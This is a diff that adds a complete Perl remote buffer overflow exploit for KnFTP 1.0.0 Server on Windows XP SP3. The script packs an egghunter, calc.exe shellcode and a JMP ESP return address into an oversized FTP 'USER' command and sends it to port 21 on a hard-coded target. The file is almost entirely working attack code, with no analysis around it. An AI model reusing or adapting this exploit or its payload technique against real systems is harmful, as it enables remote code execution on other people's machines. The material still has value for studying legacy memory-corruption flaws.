@@ -1,0 +1,73 @@
+# Exploit Title: KnFTP  1.0.0 Server - Remote Buffer Overflow Exploit,'USER' command
+# Date: 19/9/2011
+# Author: mr.pr0n (@_pr0n_)
+# Homepage: http://ghostinthelab.wordpress.com/ - http://s3cure.gr
+# Tested on: Windows XP SP3 [En]
+
+
+
+#!/usr/bin/perl
+
+use IO::Socket;
+
+# Exploit Title: KnFTP 1.0.0 Server - Remote Buffer Overflow Exploit, 'USER' command.
+# Date: 19/9/2011
+# Author: mr.pr0n (@_pr0n_)
+# Homepage: http://ghostinthelab.wordpress.com/ - http://s3cure.gr
+# Tested on: Windows XP SP3 [En]
+
+print "\n#----[ mr.pr0n ]---------------------------------------------------------#\n";
+print "#    Target App: KnFTP  1.0.0 Server                                     #\n";
+print "#    Attack    : Remote Buffer Overflow Exploit - 'USER' command         #\n";
+print "#    Target OS : Windows XP Pro English [Service Pack 3].                #\n";
+print "#------------------------------[ http://ghostinthelab.wordpress.com ]----#\n";
+
+$target 	= "192.168.178.21";
+
+# The egghunter.
+$egghunter 	= 
+"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02".
+"\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
+"w00t". # <-- The 4 byte tag
+"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";
+
+# Calc.exe
+$shellcode =
+"\xb8\xe8\xaa\x5e\xc0\xdb\xd6\xd9\x74\x24\xf4\x5b\x31\xc9\xb1".
+"\x33\x31\x43\x12\x03\x43\x12\x83\x03\x56\xbc\x35\x2f\x4f\xc8".
+"\xb6\xcf\x90\xab\x3f\x2a\xa1\xf9\x24\x3f\x90\xcd\x2f\x6d\x19".
+"\xa5\x62\x85\xaa\xcb\xaa\xaa\x1b\x61\x8d\x85\x9c\x47\x11\x49".
+"\x5e\xc9\xed\x93\xb3\x29\xcf\x5c\xc6\x28\x08\x80\x29\x78\xc1".
+"\xcf\x98\x6d\x66\x8d\x20\x8f\xa8\x9a\x19\xf7\xcd\x5c\xed\x4d".
+"\xcf\x8c\x5e\xd9\x87\x34\xd4\x85\x37\x45\x39\xd6\x04\x0c\x36".
+"\x2d\xfe\x8f\x9e\x7f\xff\xbe\xde\x2c\x3e\x0f\xd3\x2d\x06\xb7".
+"\x0c\x58\x7c\xc4\xb1\x5b\x47\xb7\x6d\xe9\x5a\x1f\xe5\x49\xbf".
+"\x9e\x2a\x0f\x34\xac\x87\x5b\x12\xb0\x16\x8f\x28\xcc\x93\x2e".
+"\xff\x45\xe7\x14\xdb\x0e\xb3\x35\x7a\xea\x12\x49\x9c\x52\xca".
+"\xef\xd6\x70\x1f\x89\xb4\x1e\xde\x1b\xc3\x67\xe0\x23\xcc\xc7".
+"\x89\x12\x47\x88\xce\xaa\x82\xed\x21\xe1\x8f\x47\xaa\xac\x45".
+"\xda\xb7\x4e\xb0\x18\xce\xcc\x31\xe0\x35\xcc\x33\xe5\x72\x4a".
+"\xaf\x97\xeb\x3f\xcf\x04\x0b\x6a\xac\xcb\x9f\xf6\x1d\x6e\x18".
+"\x9c\x61";
+
+$junk      	= "\x41" x (284 - length("w00tw00t") - length($shellcode));
+
+$eip		= "\x13\x44\x87\x7c";    	# 7C874413 JMP ESP - kernel32.dll
+$padding 	= "\x90" x 15; 			# Send 10 nops.
+
+$payload	= $junk."w00tw00t".$shellcode.$eip.$padding.$egghunter;
+
+if ($socket = IO::Socket::INET->new (PeerAddr => $target,PeerPort => "21",Proto => "TCP"))
+                { 
+					print "\n[*] Sending buffer (".(length($payload))." bytes) to: $target! \n";
+					print $socket "USER ".$payload. "\r\n";			
+					print $socket "PASS pwned \r\n";
+					sleep(1);
+					close($socket);				
+					print "[+] OK, exploitation Done!\n";
+                }
+
+else
+        {
+        	print "\n[-] Connection to $target failed!\n";
+        }
